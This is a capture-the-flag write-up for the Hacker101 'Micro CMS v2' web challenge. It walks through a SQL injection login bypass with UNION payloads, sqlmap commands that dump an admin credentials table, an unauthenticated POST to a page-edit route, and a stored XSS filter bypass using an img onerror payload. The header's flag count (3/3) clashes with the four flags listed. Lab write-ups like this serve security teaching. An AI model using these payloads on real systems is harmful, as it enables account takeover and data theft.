# Micro CMS v2 (Hacker101 CTF)

Platform: Hacker101 CTF
Difficulty: Moderate
Category: Web
Flags: 3/3

## Overview

Micro CMS v2 is a small content management app with a login form and a set of pages that can be created and edited. The intended path involves three separate bugs: a SQL injection in the login form that allows an authentication bypass, a broken access control issue that lets unauthenticated requests edit existing pages, and a stored XSS that bypasses a naive filter. A fourth flag is earned by using the SQL injection to fully extract real admin credentials rather than just bypassing the check.

For this write-up, the target hostname is replaced with `TARGET` throughout.

## Recon

The app has a login form, but no registration page, which is a hint that either there's a single seeded admin account or the interesting behavior is what an anonymous visitor can reach.

```
GET https://TARGET/
GET https://TARGET/login
```

The home page lists two pages by default:

```
/page/1  Micro CMS Changelog
/page/2  Markdown Test
```

The changelog page states that authentication was added in this version and that users need to be an admin to add or edit pages. That's a direct hint pointing at the access control layer.

## Flag 0: SQL injection authentication bypass

Sending a single quote in the username field produced a 500 error, which is the first sign the input is being concatenated directly into a query.

```
POST /login
username='&password=123

HTTP/2 500 Internal Server Error
```

A clean baseline confirmed normal behavior with no injection:

```
POST /login
username=test&password=123

HTTP/2 200 OK
"Unknown user"
```

Using `ORDER BY` to find the column count:

```
username=' ORDER BY 1-- -    200 OK
username=' ORDER BY 2-- -    500 Internal Server Error
```

The query only selects one column. That matches a query shape like:

```sql
SELECT password FROM users WHERE username = '<input>'
```

with the password comparison happening in application code rather than in SQL.

UNION-based bypass:

```
POST /login
username=' UNION SELECT 'test'-- -&password=test

HTTP/2 200 OK
Set-Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.xxxx.xxxx; HttpOnly; Path=/
"Logged In!"
```

The UNION forces the query to return the literal string `test`, which matches the submitted password and grants a session. The session cookie is a signed but unencrypted token. Base64 decoding the payload segment shows:

```json
{"admin": true}
```

The signature stops forgery without the server's secret key, but the payload itself is plainly readable.

## Flag 1: Private page reachable only through the bypassed session

Logged in with the bypass session, the home page listing includes an extra entry not shown to anonymous visitors:

```
/page/3  Private Page
```

Visiting it while authenticated reveals the flag in the page body. Requesting the same URL while fully logged out returns a proper 403, so this page is access-controlled correctly at the object level. The flag here rewards reaching the page through the authentication bypass, not an IDOR on the page view route itself.

## Flag 2: Broken access control on page editing

While mapping out what admin actually unlocks, testing HTTP methods on the edit route showed inconsistent enforcement:

```
GET  /page/edit/1     302 Found, redirects to /login
POST /page/edit/1     200 OK, flag returned directly
```

The GET handler correctly checks for an authenticated session before rendering the edit form. The POST handler that actually processes the submitted edit has no such check. Sending a POST with no cookie at all succeeds.

```
POST /page/edit/1
title=x&body=x

HTTP/2 200 OK
FLAG...
```

Interestingly, this response returns the flag directly rather than performing a real write. Refetching the page afterward shows the content unchanged, so the grader appears to treat a successful unauthenticated POST as the trigger condition rather than a persisted edit. For reference, `/page/create` correctly enforces auth on POST, and a delete route does not exist at all (404), so the missing check is specific to edit.

## Stored XSS via markdown HTML passthrough

The create and edit forms note that markdown is supported but scripts are not. Testing that filter directly:

```
body=<script>alert(1)</script>
```

Rendered output:

```html
<scrubbed>alert(1)</scrubbed>
```

The filter is naive. It matches the literal word `script` in a tag name and rewrites it, but has no concept of dangerous attributes. Switching to an event handler with no `script` keyword bypasses it entirely:

```
body=<img src=x onerror=alert(1)>
```

Rendered output, unescaped:

```html
<p><img src=x onerror=alert(1)></p>
```

This fires immediately in a browser since `src=x` is invalid and triggers `onerror` on load. Confirmed with an actual alert box on the resulting page, which is publicly viewable with no authentication required.

The title field was tested with the same payload and found to be properly HTML entity encoded in both the `<title>` and `<h1>` contexts, so the vulnerability is isolated to the markdown rendered body field only.

## Flag 3: Full credential extraction with sqlmap

The UNION bypass proves the injection but only gives pass or fail feedback per request, which makes manual data extraction through the login form impractical. Automating with sqlmap instead.

```bash
sqlmap -u "https://TARGET/login" \
  --data="username=test&password=test" \
  -p username
```

This confirms the injection as both time-based blind and UNION-based with a single column, and identifies the backend as MySQL (MariaDB fork).

Listing databases surfaces the application's own schema alongside the default MySQL ones. Scoping directly to it avoids wasting time enumerating `information_schema`:

```bash
sqlmap -u "https://TARGET/login" \
  --data="username=test&password=test" \
  -p username \
  --dbms=mysql \
  -D level2 \
  -T admins \
  --dump \
  --batch
```

Result:

```
Database: level2
Table: admins
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | malika   | elodia   |
+----+----------+----------+
```

Logging in normally with the recovered credentials, no injection at all:

```
POST /login
username=elodia&password=malika

HTTP/2 200 OK
FLAG...
```

This is a distinct flag from the UNION bypass. It specifically rewards recovering and using real credentials through full extraction, not just defeating the check.

## Credentials and flags found

* Admin credentials: `elodia` / `malika` (MySQL `level2.admins` table)
* Flag 0: SQL injection authentication bypass
* Flag 1: Private page reached via bypassed session
* Flag 2: Unauthenticated POST to `/page/edit/<id>`
* Flag 3: Real login using extracted credentials

## Techniques used

* SQL injection, UNION-based
* SQL injection, time-based blind
* SQL injection, authentication bypass
* Broken access control, missing check on one HTTP method but not another
* IDOR style discovery of an unlisted page
* Stored XSS, filter bypass through HTML passthrough in a markdown renderer
* Automated extraction with sqlmap

## Lessons learned

Early payload attempts failed purely on syntax, not logic. Spacing around `OR` and a missing trailing space after `--` broke the query in ways that looked like a dead end but were really just malformed SQL. Worth testing payload syntax incrementally rather than assuming one form works everywhere.

The unauthenticated edit endpoint returns the flag directly instead of performing a real write, which initially looked like a bug that wasn't working. A response that doesn't visibly change application state can still be the actual trigger condition, so it's worth reading the raw response before assuming failure.

Unscoped sqlmap runs burn a lot of time walking MySQL's own system schemas under time-based blind extraction. Identifying the application's actual database name early and scoping every further query to it made the extraction dramatically faster.
